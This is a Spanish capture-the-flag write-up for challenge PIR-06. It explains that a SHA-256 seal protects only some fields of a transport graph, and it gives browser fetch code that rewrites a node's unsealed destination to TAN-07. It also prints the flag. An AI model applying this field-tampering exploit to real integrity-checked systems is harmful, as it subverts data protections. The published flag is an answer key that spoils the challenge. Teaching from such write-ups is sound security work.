# Ruta Desviada — PIR-06

## 1. Datos del reto

| Campo | Valor |
|-------|-------|
| **Nombre** | PIR-06. ORDOP. Alteración del plan de transporte |
| **Categoría** | Scripting |
| **Plataforma** | `https://retos.locdynamics.com/reto06/` |
| **Formato** | KotH (King of the Hill): 1 punto/minuto mientras el desvío sea tuyo, hasta 15 puntos por ventana |
| **Objetivo** | Cambiar el nodo de destino de la ruta sin invalidar la verificación de integridad, y mantener el cambio durante la ventana activa (45-60 min) |
| **Flag** | `T4C{gr4f0_h4sh_p4rc14l_ru74_d3sv14d4}` |

---

## 2. Concepto clave: hash parcial

El reto se llama "hash parcial" porque el sello SHA-256 que protege el grafo **solo cubre algunos campos**, dejando otros fuera. Eso permite modificar los campos no sellados sin que la verificación falle.

### Esquema del sello

Obtenido de `/reto06/api/esquema`:

    {
      "objetivo": "El plan de transporte debe salir de ALG-01. Se evalúa el primer salto de la ruta.",
      "sello": {
        "algoritmo": "sha256(sal + '|' + campos)[:32]",
        "campos": ["id", "nombre", "tipo", "lat", "lon"],
        "formato_campo": "<clave>=<valor>, unidos por '|', en el orden dado",
        "nota": "La sal es interna. No se publica."
      },
      "validacion": "Se recalcula el sello de cada nodo y debe coincidir."
    }

**Conclusión:** `destino` y `prioridad` **NO están en el sello**. Se pueden modificar libremente.

---

## 3. Reconocimiento

### 3.1. La página no usa Fetch/XHR normales

Al abrir DevTools → Network → Fetch/XHR, no aparecía nada. La página no carga el grafo por AJAX; lo hace al renderizar el HTML desde el servidor.

### 3.2. Pistas en el HTML

En el HTML fuente (`view-source`) se encontraron:

- **Footer con la API:**
      GET  /api/grafo     -> obtener el grafo
      GET  /api/esquema   -> obtener el esquema del sello
      POST /api/grafo     -> enviar el grafo modificado
      GET  /api/ranking   -> ranking

  (Las rutas reales son `/reto06/api/...`)

- **Ticker con aviso:**
  > "AVISO: Nodo ALG-01 es el origen - Sello SHA-256 cubre id,nombre,tipo,lat,lon - destino y prioridad NO están en el sello"

- **Registro de actividad:** otros equipos enviaban `ALG-01 -> TAN-07` y el sistema lo aceptaba como "(desvío)".

### 3.3. Estructura del grafo

La respuesta de `GET /reto06/api/grafo` tiene esta forma:

    {
      "grafo": [ ...array de nodos... ],
      "historico": [ ...array de envíos... ],
      "ventana_activa_segundos": 2535
    }

Cada nodo tiene esta forma:

    {
      "destino": "ALG-01",
      "id": "ALG-02",
      "lat": 36.1432,
      "lon": -5.4489,
      "nombre": "Muelle de la Isla Verde",
      "prioridad": 2,
      "sello": "9685c47b10d6d7f3422833afc032ae15",
      "tipo": "puerto"
    }

---

## 4. Explotación

### Paso 1: Obtener el grafo

    fetch('/reto06/api/grafo').then(r=>r.json()).then(d=>console.log(JSON.stringify(d,null,2)))

### Paso 2: Modificar el destino de ALG-01

El destino objetivo es `TAN-07` (el "desvío" que pide el reto).

### Paso 3: Enviar el grafo modificado

**Importante:** el POST espera **solo el array de nodos**, no el objeto completo.

    fetch('/reto06/api/grafo')
      .then(r=>r.json())
      .then(data=>{
        const nodos = data.grafo.map(n=>{
          if(n.id==='ALG-01'){ n.destino='TAN-07'; }
          return n;
        });
        return fetch('/reto06/api/grafo',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify(nodos)
        });
      })
      .then(r=>r.text())
      .then(t=>console.log('RESPUESTA:',t))
      .catch(e=>console.error('ERROR:',e));

### Paso 4: Leer el flag

La respuesta del servidor es:

    {
      "aviso": "El desvío queda activo para todos los equipos hasta el próximo reset.",
      "estado": "plan de transporte actualizado",
      "flag": "T4C{gr4f0_h4sh_p4rc14l_ru74_d3sv14d4}",
      "ventana_activa_segundos": 2535
    }

---

## 5. Errores encontrados y soluciones

| Error | Causa | Solución |
|-------|-------|----------|
| 404 en `/api/esquema` | Ruta incorrecta (falta `/reto06`) | Usar `/reto06/api/esquema` |
| `Cannot read properties of undefined (reading 'map')` | El array no está en `.nodos` | El array está en `.grafo` |
| 400 Bad Request: "se espera una lista de nodos" | Se envió el objeto completo | Enviar solo el array `data.grafo` |
| Flag incorrecto | Copiado con mayúsculas erróneas | El flag usa minúsculas: `ru74`, no `rU74` |

---

## 6. Destinos probados y resultados

| Destino | Resultado |
|---------|-----------|
| CEU-02 | "plan de transporte actualizado" (sin flag) |
| CEU-09 | "plan de transporte actualizado" (sin flag) |
| ALG-02 | "plan de transporte actualizado" (sin flag) |
| **TAN-07** | "plan de transporte actualizado" + **FLAG** (desvío) |

Solo **TAN-07** es el destino de desvío que devuelve el flag.

---

## 7. Lecciones aprendidas

1. **No todos los retos usan APIs REST visibles en Fetch/XHR.** Hay que revisar el HTML fuente, el footer, los comentarios y los scripts cargados.
2. **Un sello de integridad que no cubre todos los campos es vulnerable.** Si el sello solo cubre `id`, `nombre`, `tipo`, `lat`, `lon`, los campos `destino` y `prioridad` se pueden alterar sin romper la verificación.
3. **Leer el esquema antes de atacar ahorra tiempo:** `/api/esquema` reveló exactamente qué campos cubre el sello.
4. **El formato de envío importa:** el POST esperaba solo el array, no el objeto completo.
5. **Los flags son sensibles a mayúsculas/minúsculas.** Copiar y pegar con cuidado.
6. **En retos KotH**, el flag puede ser estático (mismo para todos los equipos) o dinámico (rota por ventana). En este caso era estático.

---

## 8. Comandos útiles para repasar

**Obtener esquema:**

    fetch('/reto06/api/esquema').then(r=>r.text()).then(t=>console.log(t))

**Obtener grafo:**

    fetch('/reto06/api/grafo').then(r=>r.json()).then(d=>console.log(JSON.stringify(d,null,2)))

**Enviar desvío:**

    fetch('/reto06/api/grafo').then(r=>r.json()).then(data=>{const nodos=data.grafo.map(n=>{if(n.id==='ALG-01'){n.destino='TAN-07';}return n;});return fetch('/reto06/api/grafo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(nodos)});}).then(r=>r.text()).then(t=>console.log(t));
